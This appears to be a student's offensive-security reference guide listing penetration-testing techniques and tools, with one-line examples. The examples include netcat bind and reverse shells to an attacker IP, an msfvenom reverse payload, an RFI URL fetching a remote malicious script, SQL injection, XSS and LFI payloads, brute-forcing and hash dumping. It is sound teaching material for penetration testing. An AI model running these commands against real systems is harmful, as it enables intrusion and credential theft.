```markdown
# Offensive Security Reference Guide

This document provides a comprehensive list of offensive security topics, tools, and techniques covered in the Offensive Security Unit. Use this as a quick reference for future penetration testing engagements.

---

## Penetration Testing Topics

- **OSINT**: Open Source Intelligence gathering to collect publicly available information about a target.
  - **Example**: Use `theHarvester` to gather email addresses and subdomains:
    ```bash
    theHarvester -d example.com -l 500 -b google
    ```

- **MITRE Framework**: A framework for understanding and mapping adversary tactics and techniques.
  - **Example**: Map lateral movement techniques to MITRE ATT&CK Tactic `TA0008`.

- **Enumeration**: Identifying users, services, and resources on a target system or network.
  - **Example**: Use `enum4linux` to enumerate SMB shares:
    ```bash
    enum4linux -a <target-ip>
    ```

- **Port Scanning**: Discovering open ports and services on a target system.
  - **Example**: Use `nmap` to scan for open ports:
    ```bash
    nmap -sS -p 1-1000 <target-ip>
    ```

- **Exploitation**: Leveraging vulnerabilities to gain unauthorized access to a system.
  - **Example**: Exploit SMB with Metasploit's EternalBlue module:
    ```plaintext
    use exploit/windows/smb/ms17_010_eternalblue
    ```

- **Shells**:
  - **Bind Shell**: The target machine opens a port and waits for the attacker to connect.
    - **Example**: Use `netcat` to create a bind shell:
      ```bash
      nc -lvp 4444 -e /bin/bash
      ```
  - **Reverse Shell**: The target machine connects back to the attacker.
    - **Example**: Use `msfvenom` to generate a reverse shell payload:
      ```bash
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o shell.exe
      ```

- **Lateral Movement**: Moving between systems within a network using compromised credentials or exploits.
  - **Example**: Use `PsExec` to execute commands on another machine:
    ```bash
    psexec \\<target-ip> -u <username> -p <password> cmd.exe
    ```

- **Persistence**: Maintaining access to a compromised system over time.
  - **Example**: Use Metasploit's persistence module:
    ```plaintext
    run persistence -U -i 10 -p 4444 -r <attacker-ip>
    ```

---

## Web Application Vulnerabilities

- **Injection Vulnerabilities**:
  - **SQL Injection**: Exploiting improperly sanitized SQL queries to manipulate databases.
    - **Example**: Use `' OR '1'='1` in a login form to bypass authentication.
  - **XSS (Cross-Site Scripting)**:
    - **Stored XSS**: Inject a malicious script into a comment field that executes when viewed.
    - **Reflected XSS**: Inject a script into a URL parameter:
      ```plaintext
      http://example.com/search?q=<script>alert('XSS')</script>
      ```

- **Back-End Component Vulnerabilities**: Exploiting weaknesses in server-side components.
  - **Example**: Exploit an outdated Apache Struts server using Metasploit.

- **Directory Traversal**: Accessing restricted directories and files on a server.
  - **Example**: Use `../../etc/passwd` in a vulnerable URL to access sensitive files.

- **LFI (Local File Inclusion)**: Including local files on the server in the web application.
  - **Example**: Access passwd via a vulnerable parameter:
    ```plaintext
    http://example.com/index.php?page=../../etc/passwd
    ```

- **RFI (Remote File Inclusion)**: Including remote files in the web application.
  - **Example**: Inject a malicious script hosted on your server:
    ```plaintext
    http://example.com/index.php?page=http://<attacker-ip>/malicious.php
    ```

---

## Authentication Vulnerabilities

- **Session Management**: Exploiting weaknesses in session handling mechanisms.
  - **Example**: Steal a session cookie using XSS and reuse it to impersonate a user.

- **Brute-Force Attacks**: Attempting multiple username and password combinations to gain access.
  - **Example**: Use `Hydra` to brute-force SSH credentials:
    ```bash
    hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
    ```

---

## Penetration Testing Tools

- **Metasploit and Meterpreter**: A framework for exploitation and post-exploitation activities.
  - **Example**: Use Meterpreter to dump password hashes:
    ```plaintext
    meterpreter > hashdump
    ```

- **Nmap**: A network scanning tool for discovering hosts, services, and vulnerabilities.
  - **Example**: Scan for vulnerabilities using Nmap scripts:
    ```bash
    nmap --script vuln <target-ip>
    ```

- **Recon-ng**: A reconnaissance framework for gathering OSINT.
  - **Example**: Use the `recon/domains-hosts/bing_domain_web` module to find subdomains:
    ```plaintext
    recon-ng > modules load recon/domains-hosts/bing_domain_web
    ```

- **Shodan**: A search engine for discovering internet-connected devices and services.
  - **Example**: Search for open RDP servers:
    ```plaintext
    rdp port:3389
    ```

- **SearchSploit**: A tool for searching and using exploits from the Exploit-DB database.
  - **Example**: Search for an Apache vulnerability:
    ```bash
    searchsploit apache
    ```

- **netcat**: A versatile networking tool for creating connections, transferring data, and setting up shells.
  - **Example**: Set up a reverse shell:
    ```bash
    nc -e /bin/bash <attacker-ip> 4444
    ```

---

## Web Application Testing Tools

- **Burp Suite**: A comprehensive tool for testing web application security, including intercepting requests, scanning for vulnerabilities, and exploiting weaknesses.
  - **Example**: Use the Burp Intruder tool to brute-force a login form.

---

By referencing this guide, you can quickly recall the key topics, tools, and techniques covered in the Offensive Security Unit. Use this knowledge responsibly and ethically in your penetration testing engagements.
```
